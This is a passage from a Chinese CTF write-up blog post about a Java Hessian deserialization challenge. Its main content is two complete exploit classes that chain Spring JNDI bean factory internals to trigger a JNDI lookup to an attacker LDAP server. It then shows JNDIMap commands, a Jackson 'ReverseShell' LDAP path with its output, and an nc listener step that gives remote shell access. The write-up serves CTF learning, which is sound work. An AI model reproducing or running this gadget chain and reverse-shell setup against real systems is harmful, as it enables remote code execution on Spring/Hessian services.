-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.ysomap.ReflectionHelper</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.rctf.server.tool.Maybe</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeSet</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">exp3</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">theUnsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Unsafe</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">theUnsafe</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="w"> </span><span class="n">theUnsafe</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SimpleJndiBeanFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SimpleJndiBeanFactory</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">c1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">allocateInstance</span><span class="p">(</span><span class="n">c1</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">c1</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;beanFactory&#34;</span><span class="p">)),</span><span class="w"> </span><span class="n">factory</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">jndiUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ldap://xxx:xxxx&#34;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">o1</span><span class="p">,</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">c1</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;targetBeanName&#34;</span><span class="p">)),</span><span class="w"> </span><span class="n">jndiUrl</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">o2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">allocateInstance</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class="p">));</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">objectFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;objectFactory&#34;</span><span class="p">));</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">o2</span><span class="p">,</span><span class="w"> </span><span class="n">objectFactory</span><span class="p">,</span><span class="w"> </span><span class="n">o1</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Maybe</span><span class="w"> </span><span class="n">maybe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Maybe</span><span class="p">(</span><span class="n">o2</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeSet</span><span class="w"> </span><span class="n">treeSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">makeTreeSet</span><span class="p">(</span><span class="n">maybe</span><span class="p">,</span><span class="w"> </span><span class="n">maybe</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">HessianFactory</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">treeSet</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HessianFactory</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">TreeSet</span><span class="w"> </span><span class="nf">makeTreeSet</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">v1</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">v2</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectionHelper</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;size&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectionHelper</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;modCount&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">nodeC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.util.TreeMap$Entry&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">nodeCons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeC</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">nodeC</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">nodeCons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeCons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeCons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">node</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectionHelper</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">node</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;right&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">right</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectionHelper</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">node</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeSet</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReflectionHelper</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">set</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;m&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">m</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">set</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>其实就是从后往前构造，先将SimpleJndiBeanFactory和jndi的恶意url填入TargetBeanObjectFactory的两个属性，然后传给ObjectFactoryDelegatingInvocationHandler的objectFactory，最后作为InvocationHandler传入到maybe这个类的代理，最外面套一个TreeMap触发，这里这个<code>makeTreeSet</code>函数是搬ysoMap里面的</p>
-<p><img src="/p/2025rctfwp/image-20251119192934440.png"
-	width="1504"
-	height="910"
-	srcset="/p/2025rctfwp/image-20251119192934440_hu5095708967622862415.png 480w, /p/2025rctfwp/image-20251119192934440_hu3949874044602517982.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251119192934440"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="165"
-		data-flex-basis="396px"
-	
-></p>
-<p>当然这题也可以将url先放在SimpleJndiBeanFactory里面一块传给TargetBeanObjectFactory，同时这题是jdk8,也可以考虑不用unsafe反射</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.beans.factory.BeanFactory</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.beans.factory.ObjectFactory</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.TreeMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.rctf.server.tool.Maybe</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">exp4</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SimpleJndiBeanFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SimpleJndiBeanFactory</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ldap://xxx:xxxx&#34;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//可以在这一步设置url</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">factory</span><span class="p">.</span><span class="na">setShareableResources</span><span class="p">(</span><span class="n">url</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">c1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c1</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">BeanFactory</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectFactory</span><span class="w"> </span><span class="n">objectFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectFactory</span><span class="p">)</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">factory</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">c2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">constructor2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c2</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">ObjectFactory</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor2</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">invocationHandler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">constructor2</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">objectFactory</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Maybe</span><span class="w"> </span><span class="n">maybe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Maybe</span><span class="p">(</span><span class="n">invocationHandler</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//其实这下面用优先队列那个compare也能触发，或者直接用TreeMap包装就行</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeMap</span><span class="w"> </span><span class="n">treeMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">treeMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">maybe</span><span class="p">,</span><span class="n">maybe</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">serialize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HessianFactory</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">treeMap</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HessianFactory</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">serialize</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>后面就是jndi注入，这里可以选择打jackson+springaop这条原生链反弹shell,利用jndimap起个服务反弹shell，或者用java-chains二次反序列化打内存马也行</p>
-<p>之前一直没打明白，现在记录一下jndimap这玩意的用法</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@iZgw05z0rnhp390rdoq7z7Z:~# java -jar JNDIMap-0.0.3.jar
-</span></span><span class="line"><span class="cl"><span class="o">[</span>RMI<span class="o">]</span> Listening on 127.0.0.1:1099
-</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> Listening on 127.0.0.1:3456
-</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Listening on 127.0.0.1:1389
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后触发点填入<code>ldap://xxx:1389/Deserialize/Jackson/ReverseShell/xxx/4444</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Received query: /Deserialize/Jackson/ReverseShell/xxx/4444
-</span></span><span class="line"><span class="cl"><span class="o">[</span>Deserialize<span class="o">]</span> <span class="o">[</span>Jackson<span class="o">]</span> <span class="o">[</span>ReverseShell<span class="o">]</span> Host: xxx Port: <span class="m">4444</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Sending serialized gadget
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>出现这个就成了，另一边要同时起nc监听</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/ctf/">CTF</a>
-        
-            <a href="/tags/java/">Java</a>
-        
-    </section>
-
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under 9u_l3</span>
-    </section>
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">相关文章</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%BC%BA%E7%BD%91s9ruoyiwp/">
-        
-        
-            <div class="article-image">
-                <img src="/p/%E5%BC%BA%E7%BD%91s9ruoyiwp/1.b0bea4324e3a7a58cc094ee98a832a09.png" 
-                        width="1476" 
-                        height="2000" 
-                        loading="lazy"
-                        alt="Featured image of post 强网s9RuoYiwp"
-                        
-                        data-hash="md5-sL6kMk46eljMCU7pioMqCQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">强网s9RuoYiwp</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/2026-ccb-final-wp/">
-        
-        
-            <div class="article-image">
-                <img src="/p/2026-ccb-final-wp/1.29e00e42c4a92fe91bf58411090663fa.webp" 
-                        width="3508" 
-                        height="2480" 
-                        loading="lazy"
-                        alt="Featured image of post 2026 ccb final wp"
-                        
-                        data-hash="md5-KeAOQsSpL&#43;kb9YQRCQZj&#43;g==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2026 ccb final wp</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/2026%E7%BA%A2%E6%98%8E%E8%B0%B7finalwp/">
-        
-        
-            <div class="article-image">
-                <img src="/p/2026%E7%BA%A2%E6%98%8E%E8%B0%B7finalwp/1.9bd04a2842d6f31abe7c5c43bd5d8677.webp" 
-                        width="1200" 
-                        height="2465" 
-                        loading="lazy"
-                        alt="Featured image of post 2026红明谷finalwp"
-                        
-                        data-hash="md5-m9BKKELW8xq&#43;fFxDvV2Gdw==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2026红明谷finalwp</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">
-        
-        
-            <div class="article-image">
-                <img src="/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/1.ef1d805156976ef40c35c77919eb80cc.webp" 
-                        width="2489" 
-                        height="1400" 
-                        loading="lazy"
-                        alt="Featured image of post 2026PolarisCTF出题小记"
-                        
-                        data-hash="md5-7x2AUVaXbvQMNcd5GeuAzA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2026PolarisCTF出题小记</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-        
-        
-            <div class="article-image">
-                <img src="/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/1.615af6e77357ecd5b992836663ceda7b.jpg" 
-                        width="2196" 
-                        height="3073" 
-                        loading="lazy"
-                        alt="Featured image of post 2026ccb&amp;ciscn半决经验总结"
-                        
-                        data-hash="md5-YVr253NX7NW5koNmY87aew==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2026ccb&amp;ciscn半决经验总结</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
-
-     
-    
-        
